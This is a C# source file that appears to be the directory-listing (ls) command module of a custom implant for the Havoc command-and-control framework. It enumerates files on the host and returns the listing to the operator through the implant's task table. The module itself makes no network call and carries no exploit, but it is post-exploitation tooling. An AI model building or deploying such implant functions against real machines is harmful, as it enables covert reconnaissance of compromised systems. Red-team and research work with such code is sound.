using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HavocImplant.AgentFunctions
{
    public class Ls
    {
        public static void Run(Implant agent, string dir, int taskId)
        {
            dir = dir.Replace("\"", "");
            string retVal = "";
            if (dir.StartsWith("\\") || Regex.Match(dir.ToLower(), @"^\D:\\").Success)
                dir = Path.GetFullPath(Path.Combine(new string[] { dir }));
            else
                dir = Path.GetFullPath(Path.Combine(new string[] { Directory.GetCurrentDirectory() + "\\", dir }));
                
            retVal = String.Format("\n Directory Listing for: {0}\n\n", dir);
            
            if (String.IsNullOrEmpty(dir)) // Empty = current directory
            {
                foreach (var result in Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()))
                {
                    retVal += parseFileSystemEntry(result);
                }
            }
            else
            {
                if (Directory.Exists(dir))
                {
                    foreach (var result in Directory.GetFileSystemEntries(dir))
                    {
                        retVal += parseFileSystemEntry(result);
                    }
                }
                else if (Directory.Exists(Directory.GetCurrentDirectory() + "\\" + dir))
                {

                    foreach (var result in Directory.GetFileSystemEntries(Directory.GetCurrentDirectory() + "\\" + dir))
                    {
                        retVal += parseFileSystemEntry(result);
                    }
                }
                else
                {
                    retVal = String.Format("{0} does not exist", dir);
                }
            }
            Console.WriteLine("I have ls'd");
            Console.WriteLine(retVal);
            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n" + retVal).Replace("\\", "\\\\").Replace("\"", "\\\""));
        }
        public static string parseFileSystemEntry(string entry)
        {
            string retVal = "";
            if (File.GetAttributes(entry).HasFlag(FileAttributes.Directory)) retVal += "<DIR>              ";
            else
            {
                var fi = new FileInfo(entry);
                retVal += String.Format("       {0, -12}", fi.Length);

            }
            string[] items = entry.Split(new char[] { '\\' });
            retVal += items[items.Length - 1] + "\n";
            return retVal;
        }
    }
}
